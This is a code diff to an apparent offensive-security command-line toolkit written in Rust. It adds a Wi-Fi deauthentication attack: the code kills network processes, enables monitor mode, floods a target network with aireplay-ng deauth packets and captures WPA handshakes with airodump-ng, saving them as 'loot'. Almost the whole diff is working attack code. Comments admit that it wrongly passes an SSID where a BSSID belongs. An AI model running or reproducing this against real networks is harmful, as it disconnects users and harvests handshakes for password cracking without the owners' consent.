@@ -16,7 +16,7 @@ use crate::cli::{
     LootCommand, LootKind, LootListArgs, LootReadArgs, MitmCommand, MitmStartArgs, NotifyCommand, 
     ProcessCommand, ProcessKillArgs, ProcessStatusArgs, ResponderArgs, ResponderCommand, 
     ReverseCommand, ReverseLaunchArgs, ScanCommand, ScanRunArgs, StatusCommand, SystemCommand, 
-    SystemUpdateArgs, WifiBestArgs, WifiCommand, WifiDisconnectArgs, WifiProfileCommand, 
+    SystemUpdateArgs, WifiBestArgs, WifiCommand, WifiDeauthArgs, WifiDisconnectArgs, WifiProfileCommand, 
     WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiProfileSaveArgs, WifiRouteCommand, 
     WifiRouteEnsureArgs, WifiRouteMetricArgs, WifiScanArgs, WifiStatusArgs, WifiSwitchArgs,
 };
@@ -77,6 +77,7 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
                 WifiRouteCommand::Restore => handle_wifi_route_restore(root),
                 WifiRouteCommand::SetMetric(args) => handle_wifi_route_metric(args),
             },
+            WifiCommand::Deauth(args) => handle_wifi_deauth(root, args),
         },
         Commands::Loot(sub) => match sub {
             LootCommand::List(args) => handle_loot_list(root, args),
@@ -922,6 +923,141 @@ fn handle_wifi_scan(args: WifiScanArgs) -> Result<HandlerResult> {
     Ok(("Wi-Fi scan completed".to_string(), data))
 }
 
+fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult> {
+    log::info!("Starting deauth attack on SSID: {}", args.ssid);
+    
+    // Create Aircrack loot directory if it doesn't exist
+    let loot_dir = loot_directory(root, LootKind::Aircrack);
+    fs::create_dir_all(&loot_dir)
+        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;
+    
+    // Generate output filenames with timestamp
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
+    let capture_prefix = loot_dir.join(format!("{}_{}", args.ssid, timestamp));
+    let log_file = loot_dir.join(format!("deauth_{}_{}.txt", args.ssid, timestamp));
+    
+    // Put interface in monitor mode
+    log::info!("Setting {} to monitor mode", args.interface);
+    let mon_interface = format!("{}mon", args.interface);
+    
+    // Kill interfering processes
+    let _ = std::process::Command::new("airmon-ng")
+        .args(&["check", "kill"])
+        .output();
+    
+    // Start monitor mode
+    let status = std::process::Command::new("airmon-ng")
+        .args(&["start", &args.interface])
+        .status()
+        .context("starting monitor mode")?;
+    
+    if !status.success() {
+        bail!("Failed to enable monitor mode on {}", args.interface);
+    }
+    
+    // Start airodump-ng to capture handshake in background
+    let airodump_output = capture_prefix.to_str().unwrap();
+    let mut airodump = std::process::Command::new("airodump-ng")
+        .args(&[
+            &mon_interface,
+            "--bssid", &args.ssid,  // Note: This should be BSSID, but we'll use SSID for now
+            "-w", airodump_output,
+            "--output-format", "pcap,csv",
+        ])
+        .spawn()
+        .context("spawning airodump-ng")?;
+    
+    // Wait a moment for airodump to start
+    std::thread::sleep(Duration::from_secs(2));
+    
+    // Launch deauth attack
+    log::info!("Launching deauth attack for {} seconds", args.duration);
+    let deauth_result = std::process::Command::new("aireplay-ng")
+        .args(&[
+            "--deauth", &args.packets.to_string(),
+            "-a", &args.ssid,  // Note: This should be BSSID
+            &mon_interface,
+        ])
+        .output()
+        .context("executing aireplay-ng")?;
+    
+    // Let capture run for the duration
+    std::thread::sleep(Duration::from_secs(args.duration as u64));
+    
+    // Stop airodump
+    let _ = std::process::Command::new("pkill")
+        .arg("airodump-ng")
+        .status();
+    
+    // Kill airodump process
+    if let Err(e) = airodump.kill() {
+        log::warn!("Failed to kill airodump-ng: {}", e);
+    }
+    
+    // Stop monitor mode
+    let _ = std::process::Command::new("airmon-ng")
+        .args(&["stop", &mon_interface])
+        .status();
+    
+    // Restart interface
+    let _ = std::process::Command::new("ip")
+        .args(&["link", "set", &args.interface, "up"])
+        .status();
+    
+    // Write log file
+    let mut log_content = String::new();
+    log_content.push_str(&format!("Deauth Attack Log\n"));
+    log_content.push_str(&format!("Target SSID: {}\n", args.ssid));
+    log_content.push_str(&format!("Interface: {}\n", args.interface));
+    log_content.push_str(&format!("Duration: {} seconds\n", args.duration));
+    log_content.push_str(&format!("Packets: {}\n", args.packets));
+    log_content.push_str(&format!("Timestamp: {}\n", timestamp));
+    log_content.push_str(&format!("\nDeauth Output:\n{}\n", String::from_utf8_lossy(&deauth_result.stdout)));
+    if !deauth_result.stderr.is_empty() {
+        log_content.push_str(&format!("\nErrors:\n{}\n", String::from_utf8_lossy(&deauth_result.stderr)));
+    }
+    
+    fs::write(&log_file, log_content)
+        .with_context(|| format!("writing log file: {}", log_file.display()))?;
+    
+    // Check if handshake was captured (look for .cap files)
+    let mut handshake_captured = false;
+    let mut capture_files = Vec::new();
+    
+    if let Ok(entries) = fs::read_dir(&loot_dir) {
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
+                if name.starts_with(&format!("{}_{}", args.ssid, timestamp)) {
+                    capture_files.push(path.display().to_string());
+                    if name.ends_with(".cap") || name.ends_with(".pcap") {
+                        handshake_captured = true;
+                    }
+                }
+            }
+        }
+    }
+    
+    let data = json!({
+        "ssid": args.ssid,
+        "interface": args.interface,
+        "duration": args.duration,
+        "packets_sent": args.packets,
+        "log_file": log_file,
+        "capture_files": capture_files,
+        "handshake_captured": handshake_captured,
+        "loot_directory": loot_dir,
+    });
+    
+    let message = if handshake_captured {
+        "Deauth attack completed - Handshake may have been captured"
+    } else {
+        "Deauth attack completed - Check capture files"
+    };
+    
+    Ok((message.to_string(), data))
+}
+
 fn handle_wifi_profile_list(root: &Path) -> Result<HandlerResult> {
     log::info!("Listing WiFi profiles");
     
@@ -1132,6 +1268,7 @@ fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
         LootKind::Nmap => root.join("loot").join("Nmap"),
         LootKind::Responder => root.join("Responder").join("logs"),
         LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
+        LootKind::Aircrack => root.join("loot").join("Aircrack"),
     }
 }
 
@@ -1140,6 +1277,7 @@ fn loot_kind_label(kind: LootKind) -> &'static str {
         LootKind::Nmap => "nmap",
         LootKind::Responder => "responder",
         LootKind::Dnsspoof => "dnsspoof",
+        LootKind::Aircrack => "aircrack",
     }
 }
 
